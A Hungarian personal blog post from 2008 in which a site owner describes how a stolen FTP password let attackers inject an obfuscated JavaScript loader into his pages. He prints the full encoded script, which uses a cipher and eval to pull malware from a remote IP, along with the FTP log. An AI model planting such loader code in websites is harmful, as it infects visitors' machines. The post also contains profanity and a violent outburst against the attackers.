---
title: "shapgvba ejtf(c){..."
slug: 'shapgvba-ejtfc'
date: "2008-02-05"
tags: 
  - "geekség"
  - "gekko"
  - "hack"
  - "virus"
  - "zsonglőrködés"
---

Amikor a pokol elszabadul.

Rémálom baszki.

Gondos házigazda lévén, rendszeresen nézegetem az oldalaimat, hogy minden rendben van-e, nem kell-e valami hozzászólást kimoderálni stb. Vasárnap feltűnt valami kis apróság. A böngészőm a csokavar.hu főoldalán valami ismeretlen add-in-t akart futtatni. Márpedig én ilyet nem írtam sehova. Aztán nézem a forrást, és 500-600 üres sorral a fájl általam gondolt vége után találtam egy ilyet:

<script language=JavaScript>var sf=" shapgvba cwzgq(d){ine xp,yfl="r|b'RhkB_98[5)XsvAPClwHix.e,2o:$uyT^&Vqa36Nd=-Z"{`z]m@GS;UIc# 0}jWMt1pf7~(n4O*+g!",xn="",c,wah,xs="",pr;sbe(xp=0;xp<d.yratgu;xp++){ c=d.puneNg(xp);wah=yfl.vaqrkBs(c);vs(wah>-1){ pr=((wah+1)%81-1);vs(pr<=0)pr+=81;xs+=yfl.puneNg(pr-1); } ryfr xs+=c;}xn+=xs;qbphzrag.jevgr(xn);}",aarf="";for(nyf=0;nyf<sf.length;nyf++){ cqd = sf.charCodeAt(nyf);if((cqd>64 && cqd<78)||(cqd>96 && cqd<110)) cqd=cqd+13;else if((cqd>77 && cqd<91)||(cqd>109 && cqd<123))cqd=cqd-13;aarf=aarf.concat(String.fromCharCode(cqd));} var hw,u; eval( aarf );hw="<7s,N#!0G431x41|-{U4k47s,N#!{>0n'sx]|3!rJ,N!|a0{<SPRdyF0G431x41|-{Z4k4Ss,N#!{0SRP-{l!!#$//JJJr1''1G|M434Gj!Gs7rs']/99x!!rU7?{tn'sx]|3!r,|i|,,|,t{{></SPRdyF>{0KH0</7s,N#!>0"; pjmtd(hw);</script>

Szoktam ronda kódot írni, de azért ez... 

Kiderült, hogy fenti szutyok valami Hong Kongi gépről (58.65.238.60) próbál egy vírust letölteni a látogató gépére.

Aztán elkezdtem a logokat böngészni, míg az FTP logban a következőre nem bukkantam:

```

Fri Feb 1 23:58:06 2008 [pid 7784] [encse] OK LOGIN: Client "58.65.238.59"
Fri Feb 1 23:58:12 2008 [pid 7787] [encse] OK DOWNLOAD: Client "58.65.238.59", "/public_html/www/index.php", 3904 bytes, 16.06Kbyte/sec
Fri Feb 1 23:58:14 2008 [pid 7787] [encse] OK UPLOAD: Client "58.65.238.59", "/public_html/www/index.php", 5498 bytes, 11.47Kbyte/sec
Fri Feb 1 23:58:16 2008 [pid 7787] [encse] OK DOWNLOAD: Client "58.65.238.59", "/public_html/gekko/index.php", 92 bytes, 0.39Kbyte/sec
Fri Feb 1 23:58:18 2008 [pid 7787] [encse] OK UPLOAD: Client "58.65.238.59", "/public_html/gekko/index.php", 1686 bytes, 3.49Kbyte/sec
Fri Feb 1 23:58:21 2008 [pid 7787] [encse] OK DOWNLOAD: Client "58.65.238.59", "/public_html/blog/index.php", 54 bytes, 0.23Kbyte/sec
Fri Feb 1 23:58:23 2008 [pid 7787] [encse] OK UPLOAD: Client "58.65.238.59", "/public_html/blog/index.php", 1648 bytes, 3.43Kbyte/sec
Fri Feb 1 23:58:26 2008 [pid 7787] [encse] OK DOWNLOAD: Client "58.65.238.59", "/public_html/zsonglor/index.php", 5645 bytes, 24.04Kbyte/sec
Fri Feb 1 23:58:28 2008 [pid 7787] [encse] OK UPLOAD: Client "58.65.238.59", "/public_html/zsonglor/index.php", 7239 bytes, 10.81Kbyte/sec
Fri Feb 1 23:58:31 2008 [pid 7787] [encse] OK DOWNLOAD: Client "58.65.238.59", "/public_html/zsonglor/siteswap/index.php", 7102 bytes, 16.60Kbyte/sec
Fri Feb 1 23:58:33 2008 [pid 7787] [encse] OK UPLOAD: Client "58.65.238.59", "/public_html/zsonglor/siteswap/index.php", 8696 bytes, 12.99Kbyte/sec

``` 

Ugyanaz a Hong Kongi IP, közvetlen a másik mellett.

Szóval valaki lenyúlta az FTP jelszavamat, és ahogy sejtem, arra használta fel, hogy ugyanezt a jelszólopó trójait terjessze az oldalaimon.

A neten találtam egy fórumot, ahol egy hasonló támadást elemeznek ([http://pouet.net/topic.php?which=5006&page=1](http://pouet.net/topic.php?which=5006&page=1)). Itt az 'én' scriptem egy másik mutációját elemzik. Szerintük az egész mögött a [Russian Business Network](http://en.wikipedia.org/wiki/Russian_Business_Network) áll, ami a wikipedia leírása alapján nagyjából a maffia. hátaf�szom.

Tegnap jelszavakat váltogattam (bankos, céges, stb.  el lehet képzelni...) Ma meg egész nap a gépet pucolgattam, de ez tisztának tűnik. Azt gondolom, hogy az otthoni, régi gépemen lesz a trójai, de ez a hétvége előtt nem fog kiderülni.

És az egészben nem is az fáj, hogy engem meghackeltek, mert előfordul az ilyesmi. De a büdös kurva életbe már: a szájbavert zsonglőr oldalamra töltik fel az ótvar szutykukat, hogy az arra tévedő gyerekek gépére másszon fel az a szemét.

Én sose voltam a halálbüntetés ellen: le kéne géppuskázni az egész baszott bagást, úgy ahogy van, aztán nézegethetnek.
